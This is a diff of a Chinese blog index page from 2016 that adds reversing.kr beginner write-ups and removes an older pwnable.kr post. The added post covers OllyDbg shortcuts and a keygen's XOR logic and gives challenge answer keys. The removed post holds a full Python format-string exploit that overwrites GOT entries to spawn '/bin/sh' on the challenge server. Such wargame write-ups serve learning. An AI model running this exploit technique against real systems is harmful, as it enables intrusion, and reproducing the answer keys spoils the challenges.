@@ -288,6 +288,148 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/10/reversing-easy/" itemprop="url">
+                  reversing.kr-easy
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-10T00:00:00+08:00" content="2016-08-10">
+              2016-08-10
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/10/reversing-easy/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/10/reversing-easy/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>都是easy题，逆向小白入门练习</p>
+<h1 id="reversing-kr-easy-crack">reversing.kr-easy-crack</h1><h2 id="Trick">Trick</h2><h3 id="OllyDbg">OllyDbg</h3><ul>
+<li><code>F2</code>      : 下断点</li>
+<li><code>F7</code>      : 单步步进</li>
+<li><code>F8</code>      : 单步步过</li>
+<li><code>F9</code>      : 执行到断点处</li>
+<li><code>ctrl+F9</code> : 一直运行直到ret指令</li>
+<li><code>alt+F9</code>  : 一直运行直到回到应用程序领空</li>
+</ul>
+<h2 id="Conclusion">Conclusion</h2><p>IDA加载程序</p>
+<p><img src="/images/reversing-easy-crack/1.jpg" alt=""></p>
+<p>容易发现用户函数<code>sub_401080</code>，其定义如下</p>
+<p><img src="/images/reversing-easy-crack/2.jpg" alt=""></p>
+<p>其中<code>GetDlgItemTextA</code>函数获取用户输入，下面的if判断语句即为<strong>Auth</strong></p>
+<p><strong>key: Ea5yR3versing</strong></p>
+<h1 id="reversing-kr-easy-keygen">reversing.kr-easy-keygen</h1><h2 id="Conclusion-1">Conclusion</h2><p>main函数中如下为关键部分</p>
+<p><img src="/images/reversing-easy-keygen/1.jpg" alt=""></p>
+<p>实现的效果相当于在循环中对输入的字符串s</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">    s[i] = s[i] ^ <span class="number">16</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">    s[i] = s[i] ^ <span class="number">32</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i%<span class="number">3</span> == <span class="number">2</span>):</span><br><span class="line">    s[i] = s[i] ^ <span class="number">48</span></span><br></pre></td></tr></table></figure>
+<p>处理完成后对输出的字符串作十六进制编码，与用户输入的serial比对</p>
+<p><strong>key:K3yg3nm3</strong></p>
+<h1 id="reversing-kr-easy-unpack">reversing.kr-easy-unpack</h1><h2 id="Conclusion-2">Conclusion</h2><p>题目提示程序加壳，只需寻找到OEP即可</p>
+<p>**key:00401150</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/09/pwnable-rookiss-fsb/" itemprop="url">
                   pwnable.kr-rookiss-fsb
                 </a>
@@ -795,130 +937,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/02/pwnable-rookiss-rsa-calculator/" itemprop="url">
-                  pwnable.kr-rookiss-rsa-calculator
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-02T00:00:00+08:00" content="2016-08-02">
-              2016-08-02
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/02/pwnable-rookiss-rsa-calculator/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/02/pwnable-rookiss-rsa-calculator/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Conclusion">Conclusion</h2><p>这道题的bug在<code>RSA_decrypt</code>函数里的<code>printf(g_pbuf)</code>，即典型的<strong>fsb漏洞</strong>，我的利用方法是覆盖<strong>got表</strong>里的<code>printf</code>和<code>putchar</code>分别为<code>system</code>和fsb发生所在的地址处</p>
-<h2 id="Trick">Trick</h2><ul>
-<li>system(junk+”/bin/sh\x00”);</li>
-</ul>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./rsa_calculator'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9012</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(io, p, q, e, d)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'p :'</span>)</span><br><span class="line">    io.writeline(str(p))</span><br><span class="line">    io.read_until(<span class="string">'q :'</span>)</span><br><span class="line">    io.writeline(str(q))</span><br><span class="line">    io.read_until(<span class="string">'e :'</span>)</span><br><span class="line">    io.writeline(str(e))</span><br><span class="line">    io.read_until(<span class="string">'d :'</span>)</span><br><span class="line">    io.writeline(str(d))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(io, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">' : '</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'paste your plain text data'</span>)</span><br><span class="line">    io.writeline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(io, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">' : '</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'paste your hex encoded data'</span>)</span><br><span class="line">    io.writeline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = sub_egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> g, y, x - a / b * y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sub_egcd(a,b)[<span class="number">1</span>]%b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cypher</span><span class="params">(io, plain)</span>:</span></span><br><span class="line">    encrypt(io, plain)</span><br><span class="line">    <span class="keyword">return</span> [io.read_line() <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>)][<span class="number">2</span>][<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plain</span><span class="params">(io, cypher)</span>:</span></span><br><span class="line">    decrypt(io, cypher)</span><br><span class="line">    <span class="keyword">return</span> [io.read_line() <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>)][<span class="number">2</span>][<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    p = <span class="number">7</span></span><br><span class="line">    q = <span class="number">37</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    d = egcd(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># print 'p=%d\nq=%d\ne=%d\nd=%d\n' % (p, q, e, d)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = zio(target, timeout = 100000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'yellow'))</span></span><br><span class="line">    io = zio(target, timeout = <span class="number">100000</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line">    set_key(io, p, q, e, d)</span><br><span class="line"></span><br><span class="line">    plt_system  = <span class="number">0x004007c0</span></span><br><span class="line">    got_printf  = <span class="number">0x00602028</span></span><br><span class="line">    got_putchar = <span class="number">0x00602000</span></span><br><span class="line">    adr_ret     = <span class="number">0x0040122b</span></span><br><span class="line"></span><br><span class="line">    payload  = get_cypher(io, <span class="string">'%83$n%79$n%064lx%78$hn%82$hn%01920lx%77$hn%02667lx%81$hn;/bin/sh\x00'</span>)</span><br><span class="line">    payload += l64(got_printf)</span><br><span class="line">    payload += l64(got_printf + <span class="number">2</span>)</span><br><span class="line">    payload += l64(got_printf + <span class="number">4</span>)</span><br><span class="line">    payload += l64(got_printf + <span class="number">6</span>)</span><br><span class="line">    payload += l64(got_putchar)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">2</span>)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">4</span>)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">6</span>)</span><br><span class="line">    decrypt(io, payload)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line">exp(target)</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -964,7 +982,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">22</span>
+              <span class="site-state-item-count">23</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
